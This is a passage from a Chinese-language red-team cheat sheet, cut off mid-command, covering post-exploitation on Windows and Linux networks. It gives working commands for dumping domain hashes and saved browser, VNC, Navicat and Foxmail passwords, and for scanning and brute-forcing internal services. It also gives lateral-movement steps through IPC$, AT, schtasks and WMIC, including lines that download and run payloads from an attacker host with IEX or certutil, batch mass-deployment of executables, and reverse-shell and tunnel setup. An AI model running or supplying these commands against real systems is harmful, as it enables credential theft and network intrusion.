id=\"nishang-2\"><a class=\"anchor\" href=\"#nishang-2\">#</a> Nishang</h2>\n<pre><code>PS &gt;Import-Module .\\Copy-VSS.ps1\nPS &gt;Copy-VSS\nPS &gt;Copy-VSS -DestinationDir C:\\ShadowCopy\\\n或MSF中\nMeterpreter&gt;load powershell\nMeterpreter&gt;powershell_import /root/Copy-VSS.ps1\nMeterpreter&gt;powershell_execute Copy-VSS\n</code></pre>\n<h2 id=\"-477\"><a class=\"anchor\" href=\"#-477\">#</a> </h2>\n<h2 id=\"mimikatz-2\"><a class=\"anchor\" href=\"#mimikatz-2\">#</a> Mimikatz</h2>\n<pre><code>#lsadump::dcsync /domain:xxx.com /all /csv\n或\n#privilege::debug\n#lsadump::lsa /inject\n</code></pre>\n<h2 id=\"-478\"><a class=\"anchor\" href=\"#-478\">#</a> </h2>\n<h2 id=\"msf-6\"><a class=\"anchor\" href=\"#msf-6\">#</a> MSF</h2>\n<pre><code>#use auxiliary/admin/smb/psexec_ntdsgrab\n#set rhost smbdomain smbuser smbpass\n#exploit\nNtds.dit文件存在/root/.msf4/loot\n后渗透模块\n#use windows/gather/credentials/domain_hashdump\n#set session 1\n</code></pre>\n<h3 id=\"lazagne\"><a class=\"anchor\" href=\"#lazagne\">#</a> laZagne</h3>\n<h2 id=\"-479\"><a class=\"anchor\" href=\"#-479\">#</a> </h2>\n<h2 id=\"windows-4\"><a class=\"anchor\" href=\"#windows-4\">#</a> windows</h2>\n<pre><code>https://github.com/AlessandroZ/LaZagne\n&gt;laZagne.exe all -oN获取所有密码输出到文件\nPowershell\nPS&gt;[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\nPS&gt;$vault = New-Object Windows.Security.Credentials.PasswordVault\nPS&gt;$vault.RetrieveAll() | % &#123; $_.RetrievePassword();$_ &#125;\n</code></pre>\n<h2 id=\"-480\"><a class=\"anchor\" href=\"#-480\">#</a> </h2>\n<h2 id=\"linux-5\"><a class=\"anchor\" href=\"#linux-5\">#</a> Linux</h2>\n<pre><code>&gt;python3 laZagne.py all\n</code></pre>\n<h3 id=\"敏感信息\"><a class=\"anchor\" href=\"#敏感信息\">#</a> 敏感信息</h3>\n<h2 id=\"-481\"><a class=\"anchor\" href=\"#-481\">#</a> </h2>\n<h2 id=\"seatbelt\"><a class=\"anchor\" href=\"#seatbelt\">#</a> Seatbelt</h2>\n<pre><code>使用Visual studio编译\n&gt;Seatbelt.exe ALL获取所有信息\n</code></pre>\n<h2 id=\"-482\"><a class=\"anchor\" href=\"#-482\">#</a> </h2>\n<h2 id=\"vnc密码\"><a class=\"anchor\" href=\"#vnc密码\">#</a> VNC 密码</h2>\n<pre><code>&gt;reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server /v password\nhttp://www.cqure.net/wp/tools/password-recovery/vncpwdump/\n解密\n&gt;vncpwdump.exe -k hash \n</code></pre>\n<h2 id=\"-483\"><a class=\"anchor\" href=\"#-483\">#</a> </h2>\n<h2 id=\"navicat信息\"><a class=\"anchor\" href=\"#navicat信息\">#</a> Navicat 信息</h2>\n<pre><code>&gt;reg query HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers /s /v host \n&gt;reg query HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers /s /v UserName \n&gt;reg query HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers /s /v pwd\n离线破解\nhttps://github.com/HyperSine/how-does-navicat-encrypt-password\n</code></pre>\n<h2 id=\"-484\"><a class=\"anchor\" href=\"#-484\">#</a> </h2>\n<h2 id=\"chrome保存的密码\"><a class=\"anchor\" href=\"#chrome保存的密码\">#</a> Chrome 保存的密码</h2>\n<pre><code>&gt;mimikatz dpapi::chrome /in:&quot;%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data&quot; /unprotect\n</code></pre>\n<h2 id=\"-485\"><a class=\"anchor\" href=\"#-485\">#</a> </h2>\n<h2 id=\"foxmail\"><a class=\"anchor\" href=\"#foxmail\">#</a> Foxmail</h2>\n<pre><code>X:\\Foxmail\\storage\\xxx\\Accounts\\Account.rec0\n使用\nFoxmail Password Decryptor解密\nhttps://securityxploded.com/foxmail-password-decryptor.php\n</code></pre>\n<h2 id=\"-486\"><a class=\"anchor\" href=\"#-486\">#</a> </h2>\n<h2 id=\"firefox保存的密码\"><a class=\"anchor\" href=\"#firefox保存的密码\">#</a> firefox 保存的密码</h2>\n<pre><code>https://www.nirsoft.net/password_recovery_tools.html\n&gt;webbrowserpassview.exe /LoadPasswordsFirefox 1 /shtml &quot;c:\\1.html&quot;\n或\n&gt;dir %appdata%\\Mozilla\\Firefox\\Profiles\\\n&gt;dir %appdata%\\Mozilla\\Firefox\\Profiles\\yn80ouvt.default\n需先结束firefox.exe进程\n压缩\n&gt;7z.exe -r -padmin123 a c:\\users\\public\\firefox.7z C:\\Users\\Administrator\\AppData\\Roaming\\Mozilla\\*.* \nhttps://github.com/unode/firefox_decrypt\nhttps://securityxploded.com/firefox-master-password-cracker.php\n</code></pre>\n<h2 id=\"-487\"><a class=\"anchor\" href=\"#-487\">#</a> </h2>\n<h2 id=\"securecrt\"><a class=\"anchor\" href=\"#securecrt\">#</a> SecureCRT</h2>\n<pre><code>C:\\Documents and Settings\\Administrator\\Application Data\\VanDyke下的config文件夹\nC:\\program files\\Vandyke software\\securecrt\\\nhttps://github.com/uknowsec/SharpDecryptPwd\n</code></pre>\n<h2 id=\"横向-3\"><a class=\"anchor\" href=\"#横向-3\">#</a> 横向</h2>\n<h3 id=\"探测存活主机-2\"><a class=\"anchor\" href=\"#探测存活主机-2\">#</a> 探测存活主机</h3>\n<h2 id=\"-488\"><a class=\"anchor\" href=\"#-488\">#</a> </h2>\n<h2 id=\"forping命令查询存活主机\"><a class=\"anchor\" href=\"#forping命令查询存活主机\">#</a> For+Ping 命令查询存活主机</h2>\n<pre><code>&gt;for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.0.%I |findstr &quot;TTL=&quot;\n</code></pre>\n<p><img data-src=\"317.png\" alt=\"\" /></p>\n<pre><code>For+Ping命令查询域名对应IP\n&gt;for /f &quot;delims=&quot; %i in (D:/domains.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[192.&quot; &gt;&gt; c:/windows/temp/ds.txt\n</code></pre>\n<h2 id=\"-489\"><a class=\"anchor\" href=\"#-489\">#</a> </h2>\n<h2 id=\"内外网资产对应\"><a class=\"anchor\" href=\"#内外网资产对应\">#</a> 内外网资产对应</h2>\n<pre><code>1.将收集到的子域名保存，使用ping命令在内网循环\nfor /f &quot;delims=&quot; %i in (host.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[10.&quot; /c:&quot;[192.&quot; /c:&quot;[172.&quot; &gt;&gt; C:/users/public/out.txt\n2.找到dns服务器ip，ipconfig或扫描开启53端口的机器\nhttps://github.com/Q2h1Cg/dnsbrute\ndnsbrute.exe -domain a.com -dict ziyuming.txt -rate 1000 -retry 1 -server 192.168.1.1:53\n3.扫描内网ip开启web服务的title\n</code></pre>\n<h2 id=\"-490\"><a class=\"anchor\" href=\"#-490\">#</a> </h2>\n<h2 id=\"nbtscan\"><a class=\"anchor\" href=\"#nbtscan\">#</a> NbtScan</h2>\n<pre><code>Windows\n&gt;nbtscan.exe -m 192.168.1.0/24\nLinux\n#nbtscan -r 192.168.0.0/24\n</code></pre>\n<h2 id=\"-491\"><a class=\"anchor\" href=\"#-491\">#</a> </h2>\n<h2 id=\"nmap-2\"><a class=\"anchor\" href=\"#nmap-2\">#</a> NMAP</h2>\n<pre><code>#nmap -Pn -open -A -n -v -iL filename.txt\n-Pn：跳过主机发现\n-n:不做DNS解析\n-open：只显示开启的端口\n-A：扫描过程中，输入回车，可以查看扫描进度\n-v：显示详细信息\n-F：快速扫描100个常见端口\n-p:选择要扫描的端口  例： -p1-65535 （全端口扫描，中间没有空格）\n-iL：为程序指定一个要扫描的IP列表\n-sV：探测开放端口的服务和版本信息\n-T可以选择扫描等级，默认T3，但想快点话，可以输入  -T4\n存活主机\n&gt;nmap -sP -PI 192.168.0.0/24\n&gt;nmap -sn -PE -T4 192.168.0.0/24\n&gt;nmap -sn -PR 192.168.0.0/24\n</code></pre>\n<h2 id=\"-492\"><a class=\"anchor\" href=\"#-492\">#</a> </h2>\n<h3 id=\"代理nmap扫描\"><a class=\"anchor\" href=\"#代理nmap扫描\">#</a> 代理 nmap 扫描</h3>\n<pre><code>meterpreter &gt; background\nmsf &gt; use auxiliary/server/socks4a\n再配置proxychains.conf\n#proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 内网IP\n</code></pre>\n<h2 id=\"-493\"><a class=\"anchor\" href=\"#-493\">#</a> </h2>\n<h2 id=\"netdiscover\"><a class=\"anchor\" href=\"#netdiscover\">#</a> NetDiscover</h2>\n<pre><code>#netdiscover -r 192.168.0.0/24 -i wlan0\n</code></pre>\n<h2 id=\"-494\"><a class=\"anchor\" href=\"#-494\">#</a> </h2>\n<h2 id=\"rp-scan\"><a class=\"anchor\" href=\"#rp-scan\">#</a> rp-scan</h2>\n<pre><code>kali\n&gt;arp-scan --interface=wlan0 -localnet\nWindows\n&gt;arp-scan.exe -t 192.168.0.0/24\n</code></pre>\n<h2 id=\"-495\"><a class=\"anchor\" href=\"#-495\">#</a> </h2>\n<h2 id=\"msf-7\"><a class=\"anchor\" href=\"#msf-7\">#</a> MSF</h2>\n<pre><code>#use auxiliary/scanner/discovery/arp_sweep\n</code></pre>\n<p><img data-src=\"318.png\" alt=\"\" /></p>\n<pre><code>#use auxiliary/scanner/discovery/udp_sweep\n</code></pre>\n<p><img data-src=\"319.png\" alt=\"\" /></p>\n<pre><code>#use auxiliary/scanner/netbios/nbname\nmeterpreter&gt;run post/windows/gather/arp_scanner RHOSTS=192.168.1.1/24\nmeterpreter&gt;run post/multi/gather/ping_sweep RHOSTS=192.168.1.1/24\n</code></pre>\n<h3 id=\"探测服务端口\"><a class=\"anchor\" href=\"#探测服务端口\">#</a> 探测服务 &amp; 端口</h3>\n<pre><code>常见端口\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>服务</th>\n<th>端口</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Mssql</td>\n<td>1433</td>\n</tr>\n<tr>\n<td>SMB</td>\n<td>445</td>\n</tr>\n<tr>\n<td>WMI</td>\n<td>135</td>\n</tr>\n<tr>\n<td>winrm</td>\n<td>5985</td>\n</tr>\n<tr>\n<td>rdp</td>\n<td>3389</td>\n</tr>\n<tr>\n<td>ssh</td>\n<td>22</td>\n</tr>\n<tr>\n<td>oracle</td>\n<td>1521</td>\n</tr>\n<tr>\n<td>mysql</td>\n<td>3306</td>\n</tr>\n<tr>\n<td>redis</td>\n<td>6379</td>\n</tr>\n<tr>\n<td>postgresql</td>\n<td>5432</td>\n</tr>\n<tr>\n<td>ldap</td>\n<td>389</td>\n</tr>\n<tr>\n<td>smtp</td>\n<td>25</td>\n</tr>\n<tr>\n<td>pop3</td>\n<td>110</td>\n</tr>\n<tr>\n<td>imap</td>\n<td>143</td>\n</tr>\n<tr>\n<td>exchange</td>\n<td>443</td>\n</tr>\n<tr>\n<td>vnc</td>\n<td>5900</td>\n</tr>\n<tr>\n<td>ftp</td>\n<td>21</td>\n</tr>\n<tr>\n<td>rsync</td>\n<td>873</td>\n</tr>\n<tr>\n<td>mongodb</td>\n<td>27017</td>\n</tr>\n<tr>\n<td>telnet</td>\n<td>23</td>\n</tr>\n<tr>\n<td>svn</td>\n<td>3690</td>\n</tr>\n<tr>\n<td>java rmi</td>\n<td>1099</td>\n</tr>\n<tr>\n<td>couchdb</td>\n<td>5984</td>\n</tr>\n<tr>\n<td>pcanywhere</td>\n<td>5632</td>\n</tr>\n<tr>\n<td>web</td>\n<td>80-90,8000-10000,7001,9200,9300</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-496\"><a class=\"anchor\" href=\"#-496\">#</a> </h2>\n<h2 id=\"powershell-5\"><a class=\"anchor\" href=\"#powershell-5\">#</a> Powershell</h2>\n<h2 id=\"-497\"><a class=\"anchor\" href=\"#-497\">#</a> </h2>\n<h3 id=\"powersploit-2\"><a class=\"anchor\" href=\"#powersploit-2\">#</a> Powersploit</h3>\n<pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powersploit/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 192.168.0.0/24 –T 4 -Ports '1-65535' -oA C:\\TEMP.txt&quot;\n</code></pre>\n<h2 id=\"-498\"><a class=\"anchor\" href=\"#-498\">#</a> </h2>\n<h3 id=\"nishang-3\"><a class=\"anchor\" href=\"#nishang-3\">#</a> Nishang</h3>\n<pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/nishang/Scan/Invoke-PortScan.ps1'); Invoke-Portscan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort&quot;\n</code></pre>\n<p><img data-src=\"320.png\" alt=\"\" /></p>\n<pre><code>去掉scanport就是探测存活\n</code></pre>\n<h2 id=\"-499\"><a class=\"anchor\" href=\"#-499\">#</a> </h2>\n<h2 id=\"smb\"><a class=\"anchor\" href=\"#smb\">#</a> SMB</h2>\n<pre><code>https://github.com/ShawnDEvans/smbmap\n</code></pre>\n<h2 id=\"-500\"><a class=\"anchor\" href=\"#-500\">#</a> </h2>\n<h3 id=\"msf-8\"><a class=\"anchor\" href=\"#msf-8\">#</a> MSF</h3>\n<pre><code>#use auxiliary/scanner/smb/smb_version查询开启139，445端口主机\n#use auxiliary/scanner/smb/smb_login 爆破\n</code></pre>\n<h2 id=\"-501\"><a class=\"anchor\" href=\"#-501\">#</a> </h2>\n<h3 id=\"nmap-3\"><a class=\"anchor\" href=\"#nmap-3\">#</a> NMAP</h3>\n<pre><code>#nmap -sU -sS --script smb-enum-shares.nse -p 445 192.168. 1.119\n</code></pre>\n<h2 id=\"-502\"><a class=\"anchor\" href=\"#-502\">#</a> </h2>\n<h3 id=\"cmd-3\"><a class=\"anchor\" href=\"#cmd-3\">#</a> CMD</h3>\n<pre><code>&gt;for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445\n</code></pre>\n<h2 id=\"-503\"><a class=\"anchor\" href=\"#-503\">#</a> </h2>\n<h2 id=\"linux-samba服务\"><a class=\"anchor\" href=\"#linux-samba服务\">#</a> Linux Samba 服务</h2>\n<pre><code>端口一般139，弱口令连接\n&gt;smbclient -L 192.168.0.110\n&gt;smbclient '\\\\192.168.0.110\\IPC$'\n#use exploit/linux/samba/is_known_pipenamea\n</code></pre>\n<h2 id=\"-504\"><a class=\"anchor\" href=\"#-504\">#</a> </h2>\n<h2 id=\"msf-9\"><a class=\"anchor\" href=\"#msf-9\">#</a> MSF</h2>\n<h2 id=\"-505\"><a class=\"anchor\" href=\"#-505\">#</a> </h2>\n<h3 id=\"端口\"><a class=\"anchor\" href=\"#端口\">#</a> 端口</h3>\n<pre><code>#use auxiliary/scanner/portscan/tcp\n#use auxiliary/scanner/portscan/ack\n</code></pre>\n<h2 id=\"-506\"><a class=\"anchor\" href=\"#-506\">#</a> </h2>\n<h3 id=\"服务\"><a class=\"anchor\" href=\"#服务\">#</a> 服务</h3>\n<pre><code>#use auxiliary/scanner/ftp/ftp_version 开启FTP的机器\n#use auxiliary/scanner/ftp/anonymous 允许匿名登录的FTP\n#use auxiliary/scanner/ftp/ftp_login FTP爆破\n#use auxiliary/scanner/http/http_version 开启HTTP服务的\n#use auxiliary/scanner/smb/smb_version 开启SMB服务的\n#use auxiliary/scanner/smb/smb_enumshares 允许匿名登录的SMB\n#use auxiliary/scanner/smb/smb_login SMB爆破\n#use auxiliary/scanner/ssh/ssh_version 开启SSH的机器\n#use auxiliary/scanner/ssh/ssh_login SSH爆破\n#use auxiliary/scanner/telnet/telnet_version 开启TELNET服务的\n#use auxiliary/scanner/telnet/telnet_login TELNET爆破\n#use auxiliary/scanner/mysql/mysql_version 开启MYSQL服务的\n#use auxiliary/scanner/mysql/mysql_login MYSQL爆破\n#use auxiliary/scanner/mssql/mssql_ping 开启SQLSERVER服务的\n#use auxiliary/scanner/mssql/mssql_login MSSQL爆破\n#use auxiliary/scanner/postgres/postgres_version开启POSTGRE服务的\n#use auxiliary/scanner/postgres/postgres_login POSTGRESQL爆破\n#use auxiliary/scanner/oracle/tnslsnr_version 开启oracle数据库的\n#use auxiliary/admin/oracle/oracle_login Oracle数据库爆破\n#use auxiliary/scanner/http/title 扫描HTTP标题\n#use auxiliary/scanner/rdp/rdp_scanner 开启RDP服务的\n#use auxiliary/scanner/http/webdav_scanner\n#use auxiliary/scanner/http/http_put 开启WEBDAV的\n#use auxiliary/scanner/smb/smb_ms17_010 存在17010漏洞的\n#use auxiliary/scanner/http/zabbix_login zabbix爆破\n#use auxiliary/scanner/http/axis_login axis爆破\n#use auxiliary/scanner/redis/redis_login redis爆破\n</code></pre>\n<h2 id=\"-507\"><a class=\"anchor\" href=\"#-507\">#</a> </h2>\n<h2 id=\"nc-3\"><a class=\"anchor\" href=\"#nc-3\">#</a> Nc</h2>\n<pre><code>&gt;nc -znv 192.168.0.98 1-65535\n</code></pre>\n<p><img data-src=\"321.png\" alt=\"\" /></p>\n<pre><code>&gt;nc -v -w 1 192.168.0.110 -z 1-1000\n&gt;for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.0.$i 21-25 -z; done\n</code></pre>\n<h2 id=\"-508\"><a class=\"anchor\" href=\"#-508\">#</a> </h2>\n<h2 id=\"masscan\"><a class=\"anchor\" href=\"#masscan\">#</a> Masscan</h2>\n<pre><code>$sudo apt-get install clang git gcc make libpcap-dev\n$git clone https://github.com/robertdavidgraham/masscan\n$cd masscan\n$make \n&gt;masscan -p80,3389,1-65535 192.168.0.0/24\n</code></pre>\n<p><img data-src=\"322.png\" alt=\"\" /></p>\n<h2 id=\"-509\"><a class=\"anchor\" href=\"#-509\">#</a> </h2>\n<h2 id=\"ptscan\"><a class=\"anchor\" href=\"#ptscan\">#</a> PTScan</h2>\n<pre><code>友好识别web服务\nhttps://github.com/phantom0301/PTscan/blob/master/PTscan.py\n&gt;python PTscan.py &#123;-f /xxx/xxx.txt or -h 192.168.1&#125; [-p 21,80,3306]  [-m 50] [-t 10] [-n(不ping)] [-b(开启banner扫描)] [-r查找IP]\n80,81,82,83,84,85,86,87,88,89,90,91,901,18080,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,443,8443,7001\n</code></pre>\n<h2 id=\"-510\"><a class=\"anchor\" href=\"#-510\">#</a> </h2>\n<h2 id=\"cobaltstrikek8-aggressor\"><a class=\"anchor\" href=\"#cobaltstrikek8-aggressor\">#</a> CobaltStrike+K8 Aggressor</h2>\n<pre><code>https://github.com/k8gege/Aggressor\n</code></pre>\n<h2 id=\"-511\"><a class=\"anchor\" href=\"#-511\">#</a> </h2>\n<h3 id=\"存活主机\"><a class=\"anchor\" href=\"#存活主机\">#</a> 存活主机</h3>\n<pre><code>beacon&gt;Cscan 192.168.0.0/24 OnlinePC\n</code></pre>\n<p><img data-src=\"323.png\" alt=\"\" /></p>\n<h2 id=\"-512\"><a class=\"anchor\" href=\"#-512\">#</a> </h2>\n<h3 id=\"ms17010\"><a class=\"anchor\" href=\"#ms17010\">#</a> MS17010</h3>\n<pre><code>beacon&gt;Cscan 192.168.0.0/24 MS17010\n</code></pre>\n<p><img data-src=\"324.png\" alt=\"\" /></p>\n<h2 id=\"-513\"><a class=\"anchor\" href=\"#-513\">#</a> </h2>\n<h3 id=\"操作系统信息\"><a class=\"anchor\" href=\"#操作系统信息\">#</a> 操作系统信息</h3>\n<pre><code>beacon&gt;Cscan 192.168.0.0/24 Osscan\n</code></pre>\n<p><img data-src=\"325.png\" alt=\"\" /></p>\n<h2 id=\"-514\"><a class=\"anchor\" href=\"#-514\">#</a> </h2>\n<h3 id=\"内网站点banner-标题扫描\"><a class=\"anchor\" href=\"#内网站点banner-标题扫描\">#</a> 内网站点 banner、标题扫描</h3>\n<pre><code>beacon&gt;Cscan 192.168.0.0/24 WebScan\n</code></pre>\n<h2 id=\"-515\"><a class=\"anchor\" href=\"#-515\">#</a> </h2>\n<h3 id=\"ftp爆破\"><a class=\"anchor\" href=\"#ftp爆破\">#</a> FTP 爆破</h3>\n<pre><code>上传账户密码文件user.txt、pass.txt到beacon目录(beacon&gt;pwd)\nbeacon&gt;Cscan 192.168.0.0/24 FtpScan\n</code></pre>\n<h2 id=\"-516\"><a class=\"anchor\" href=\"#-516\">#</a> </h2>\n<h3 id=\"wmi爆破windows账户密码\"><a class=\"anchor\" href=\"#wmi爆破windows账户密码\">#</a> WMI 爆破 windows 账户密码</h3>\n<pre><code>上传账户密码文件user.txt、pass.txt到beacon目录(beacon&gt;pwd)\nbeacon&gt;Cscan 192.168.0.0/24 WmiScan\n</code></pre>\n<h2 id=\"-517\"><a class=\"anchor\" href=\"#-517\">#</a> </h2>\n<h3 id=\"思科设备扫描\"><a class=\"anchor\" href=\"#思科设备扫描\">#</a> 思科设备扫描</h3>\n<pre><code>beacon&gt;Cscan 192.168.0.0/24 CiscoScan\n</code></pre>\n<h2 id=\"-518\"><a class=\"anchor\" href=\"#-518\">#</a> </h2>\n<h3 id=\"枚举共享\"><a class=\"anchor\" href=\"#枚举共享\">#</a> 枚举共享</h3>\n<pre><code>beacon&gt; EnumShare\n</code></pre>\n<h2 id=\"-519\"><a class=\"anchor\" href=\"#-519\">#</a> </h2>\n<h3 id=\"枚举sql-server数据库\"><a class=\"anchor\" href=\"#枚举sql-server数据库\">#</a> 枚举 SQL SERVER 数据库</h3>\n<pre><code>beacon&gt; EnumMSSQL\n</code></pre>\n<h3 id=\"执行命令ipc计划任务\"><a class=\"anchor\" href=\"#执行命令ipc计划任务\">#</a> 执行命令 &amp; IPC &amp; 计划任务</h3>\n<pre><code>建立连接\n&gt;net use \\\\192.168.1.2\\ipc$ &quot;password&quot; /user:domain\\administrator\n查看连接\n&gt;net use\n列文件\n&gt;dir \\\\192.168.1.2\\c$\n查看系统时间\n&gt;net time \\\\192.168.1.2\n上传文件\n&gt;copy 1.exe \\\\192.168.1.2\\c$\n下载文件\n&gt;copy \\\\192.168.1.2\\c$\\1.exe 1.exe\n批量IPC\n@echo off\necho check ip addr config file…\nif not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end\necho read and analysis file…\nfor /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\\\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\\\%%i -u administrator -p &quot;123456&quot; cmd\n:end\nexit\n</code></pre>\n<h2 id=\"-520\"><a class=\"anchor\" href=\"#-520\">#</a> </h2>\n<h2 id=\"at\"><a class=\"anchor\" href=\"#at\">#</a> AT</h2>\n<pre><code>&gt;net use \\\\192.168.1.2\\ipc$ &quot;password&quot; /user:domain\\administrator\n&gt;copy 1.exe \\\\192.168.1.2\\c$\n&gt;net time \\\\192.168.1.2\n&gt;at \\\\192.168.1.2 1:00AM c:\\1.exe\n&gt;at \\\\192.168.1.2 1:00AM cmd.exe /c “ipconfig &gt;c:/1.txt”\n&gt;type \\\\192.168.1.2\\c$\\1.txt\n查看计划任务\n&gt;at \\\\192.168.1.2\n删除计划任务\n&gt;at \\\\192.168.1.2 计划ID /delete\n横向批量上线\n&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;certutil.exe -urlcache -split -f http://youip.com:80/shell.txt c:/windows/debug/SysDug.exe&quot; \n&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;c:/windows/debug/SysDug.exe&quot; \n&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;certutil.exe -urlcache -split -f c:/windows/debug/SysDug.exe delete&quot;\n</code></pre>\n<h2 id=\"-521\"><a class=\"anchor\" href=\"#-521\">#</a> </h2>\n<h2 id=\"schtasks-2\"><a class=\"anchor\" href=\"#schtasks-2\">#</a> Schtasks</h2>\n<pre><code>&gt;net use \\\\192.168.0.55\\ipc$ &quot;password&quot; /user:&quot;domain\\administrator&quot;\n&gt;schtasks /query /fo LIST /v 查看计划任务\n上传文件\n&gt;copy ok.exe \\\\192.168.0.55\\c$\\windows\\temp\n远程创建定时任务 \n&gt;schtasks /create /s &quot;192.168.0.55&quot; /u &quot;admin&quot; /p &quot;qqq23&quot; /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\\windows\\temp\\ok.exe&quot; /sc DAILY /mo 1 /ST 20:28 /RU SYSTEM\n查询远程创建的任务\n&gt;schtasks /query /s &quot;192.168.0.55&quot; /U &quot;admin&quot; /P &quot;qqq23&quot; | findstr &quot;windowsupdate&quot; \n立即执行远程任务\n&gt;schtasks /run /tn windowsupdate /s &quot;192.168.0.55&quot; /U &quot;admin&quot; /P &quot;qqq23&quot; \n删除定时任务 \n&gt;schtasks /Delete /tn windowsupdate /F /s &quot;192.168.0.55&quot; /u &quot;admin&quot; /p &quot;qqq23&quot;\n删除IPC\n&gt;net user name /del /y\n横向批量上线\n&gt;for /f %i in (ip.txt) do net use \\\\%i\\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy ok.exe \\\\%i\\admin$\\debug\\ /Y ) &amp; wmic /NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\\windows\\debug\\ok.exe&quot; &amp; @ping 127.0.0.1 -n 8 &gt;nul &amp; net use \\\\%i\\admin$ /del\n</code></pre>\n<h2 id=\"-522\"><a class=\"anchor\" href=\"#-522\">#</a> </h2>\n<h2 id=\"wmic-3\"><a class=\"anchor\" href=\"#wmic-3\">#</a> WMIC</h2>\n<pre><code>&gt;net use \\\\192.168.0.55\\ipc$ &quot;password&quot; /user:&quot;domain\\administrator&quot;\n&gt;copy ok.exe \\\\192.168.0.55\\c$\\windows\\temp\n&gt;wmic /NODE:&quot; 192.168.0.55&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\\windows\\temp\\ok.exe&quot;\n&gt;del \\\\192.168.0.55\\c$\\windows\\temp\\ok.exe /F\n&gt;net use \\\\192.168.0.55\\c$ /del\n</code></pre>\n<h3 id=\"快速定位域管理登过的机器\"><a class=\"anchor\" href=\"#快速定位域管理登过的机器\">#</a> 快速定位域管理登过的机器</h3>\n<pre><code>&gt;psexec –accepteula @ips.txt –u admin –p pass@123 –c 1.bat\n#1.bat内容\ntasklist /v | find “域管理名字”\n@echo off\necho check ip addr config file…\nif not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end\necho read and analysis file…\nfor /F “eol=#” %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p pass@123 /v) &gt;&gt;d:\\result.txt\n:end\nexit\n</code></pre>\n<h3 id=\"msf添加路由\"><a class=\"anchor\" href=\"#msf添加路由\">#</a> MSF 添加路由</h3>\n<pre><code># route add 内网网卡ip 子网掩码 session的id\n# route list\n&amp;\nMeterpreter&gt;run get_local_subnets查看网段信息再添加路由\n# run autoroute -s内网网卡ip/24\n# run autoroute -p 查看路由表\n&amp;\nMeterpreter&gt;run post/multi/manage/autoroute\n</code></pre>\n<h3 id=\"msf管道监听\"><a class=\"anchor\" href=\"#msf管道监听\">#</a> MSF 管道监听</h3>\n<pre><code>在已经获得meterpreter的机器上配置管道监听器\nmeterpreter &gt; pivot add -t pipe -l 已控IP -n bgpipe -a x86 -p windows\n生成\n&gt;msfvenom -p windows/meterpreter/reverse_named_pipe PIPEHOST=已控IP PIPENAME=bgpipe -f exe -o pipe.exe.\n</code></pre>\n<h3 id=\"代理-2\"><a class=\"anchor\" href=\"#代理-2\">#</a> 代理</h3>\n<h2 id=\"-523\"><a class=\"anchor\" href=\"#-523\">#</a> </h2>\n<h2 id=\"ssh-3\"><a class=\"anchor\" href=\"#ssh-3\">#</a> SSH</h2>\n<h2 id=\"-524\"><a class=\"anchor\" href=\"#-524\">#</a> </h2>\n<h3 id=\"正向代理\"><a class=\"anchor\" href=\"#正向代理\">#</a> 正向代理</h3>\n<pre><code>SSH动态转发，是建立正向加密的socks通道\n出网靶机编辑后restart ssh服务\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n外部攻击机执行\n&gt;ssh -C -f -N -g -D 0.0.0.0:12138 root@出网靶机IP -p 22\nMSF中设置全局代理或使用其他软件\n&gt;setg proxies socks5:0.0.0.0:12138\n即可进行攻击隔离区机器\n</code></pre>\n<p><img data-src=\"326.png\" alt=\"\" /><br />\n<img data-src=\"327.png\" alt=\"\" /></p>\n<h2 id=\"-525\"><a class=\"anchor\" href=\"#-525\">#</a> </h2>\n<h3 id=\"反向代理\"><a class=\"anchor\" href=\"#反向代理\">#</a> 反向代理</h3>\n<pre><code>#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\nClientAliveInterval 修改为30-60保持连接\nClientAliveCountMax 取消注释 发送请求没响应自动断开次数\n107是外网攻击机\n内网靶机执行：\n&gt;ssh -p 22 -qngfNTR 12138:127.0.0.1:22 root@192.168.0.107\n</code></pre>\n<p><img data-src=\"328.png\" alt=\"\" /></p>\n<pre><code>攻击机执行\n&gt;ssh -p 